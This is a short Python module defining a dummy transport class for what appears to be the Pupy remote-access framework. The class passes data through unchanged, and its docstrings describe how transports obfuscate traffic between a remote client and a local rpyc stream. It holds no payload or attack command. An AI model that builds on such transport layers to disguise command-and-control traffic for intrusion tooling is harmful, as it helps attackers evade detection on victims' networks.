# -*- coding: UTF8 -*-
from ..base import BasePupyTransport

class DummyPupyTransport(BasePupyTransport):
    def downstream_recv(self, data):
        """
        receiving obfuscated data from the remote client and writing deobfuscated data to downstream
        """
        self.upstream.write(data.read())
    def upstream_recv(self, data):
        """
        receiving clear-text data from local rpyc Stream and writing obfuscated data to upstream
        """
        self.downstream.write(data.read())

